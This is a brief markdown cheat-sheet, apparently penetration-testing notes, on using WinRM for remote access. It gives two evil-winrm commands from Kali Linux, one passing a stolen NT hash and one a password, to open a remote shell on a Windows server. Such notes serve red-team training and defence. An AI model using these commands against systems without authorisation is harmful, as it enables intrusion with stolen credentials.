---
label: WinRM
---

# Windows Remote Managament (WinRM)

WinRM doesn't use RPC. All of the WinRM communication is over a single port instead of RPC which makes it pretty firewall friendly.

## Pass-the-Hash

Kali Linux:

```bash
evil-winrm -i @SERVER -u @USERNAME -H @NT_HASH
```

## Pass-the-Password

Kali Linux:

```bash
evil-winrm -i @SERVER -u @USERNAME -p @PASS
```
